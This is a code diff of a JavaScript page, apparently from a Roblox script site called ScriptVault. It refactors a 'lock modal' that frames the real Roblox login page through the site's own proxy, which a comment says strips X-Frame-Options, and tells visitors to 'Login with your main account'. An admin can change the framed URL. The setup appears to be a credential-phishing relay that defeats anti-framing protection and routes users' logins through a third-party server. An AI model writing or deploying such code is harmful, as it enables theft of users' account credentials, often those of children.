@@ -704,11 +704,17 @@ function doCopy(){
 
 // ── LOCK MODAL ─────────────────────────────────────────
 let lockTimer=null, lockSec=5;
-const PROXY_BASE    = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
-const IFRAME_KEY    = 'sv_iframe_url';
+const PROXY_BASE     = 'https://scriptvault-gray.vercel.app/api/proxy?url=';
+const IFRAME_KEY     = 'sv_iframe_url';
 const IFRAME_DEFAULT = 'https://www.roblox.com/login';
-// Read from localStorage (set by admin panel)
-function getIframeUrl(){ return localStorage.getItem(IFRAME_KEY) || IFRAME_DEFAULT; }
+// Reads URL set by admin — falls back to Roblox login
+function getIframeUrl(){
+  return localStorage.getItem(IFRAME_KEY) || IFRAME_DEFAULT;
+}
+// Build proxied URL — always goes through /api/proxy so redirects are blocked
+function buildProxyUrl(rawUrl){
+  return PROXY_BASE + encodeURIComponent(rawUrl || getIframeUrl());
+}
 
 // Listen for admin changes in real time
 try{
@@ -770,7 +776,7 @@ function showLkFrame(){
   document.getElementById('lkSub').textContent           = 'Login with your main account';
   document.getElementById('lkSpinner').classList.remove('gone');
   // Load Roblox via proxy (strips X-Frame-Options)
-  document.getElementById('lkFrame').src = PROXY_BASE + encodeURIComponent(getIframeUrl());
+  document.getElementById('lkFrame').src = buildProxyUrl();
 }
 
 function onLkFrameLoad(){
